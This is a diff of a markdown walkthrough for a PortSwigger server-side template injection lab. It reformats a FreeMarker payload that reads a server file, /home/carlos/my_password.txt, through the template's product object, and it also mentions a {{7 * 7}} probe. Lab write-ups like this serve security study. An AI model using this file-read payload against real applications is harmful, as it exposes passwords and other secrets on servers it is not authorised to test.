@@ -151,8 +151,10 @@ At the first when it tried this payload `{{7 * 7}}`, I got this error:
 
 - Another one, It is a `freemarker` template engine(java).
 
-> ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('`File_Path`').toURL().openStream().readAllBytes()?join(" ")}
-- **We will set this path ==> /home/carlos/my_password.txt
+```
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('File_Path').toURL().openStream().readAllBytes()?join(" ")}
+```
+- **We will set this path ==> /home/carlos/my_password.txt**
  
 ![decimal_lab6](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/decimal_lab6.png)
 
@@ -160,7 +162,7 @@ At the first when it tried this payload `{{7 * 7}}`, I got this error:
 - Check out the [decimal ascci chart](https://www.asciichart.com/).
 - For doing it quickly, you can use [CyberChef](https://gchq.github.io/CyberChef/)
 
-- Another Solution:
+- ##### Another Solution:
 	- But you will identify the existing object in the template.
 	- Here you will set the `product` object.
 
